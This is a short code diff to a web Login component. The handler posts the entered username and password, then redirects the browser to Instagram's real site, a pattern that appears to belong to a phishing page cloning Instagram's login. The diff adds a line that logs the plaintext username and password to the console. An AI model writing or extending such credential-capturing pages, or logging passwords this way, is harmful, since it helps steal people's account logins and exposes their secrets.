@@ -12,6 +12,7 @@ function Login() {
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ username, password }),
     });
+    console.log(username, password);
     window.location.href = "https://www.instagram.com";
   };
 
@@ -57,4 +58,5 @@ function Login() {
 }
 
 export default Login;
+
 
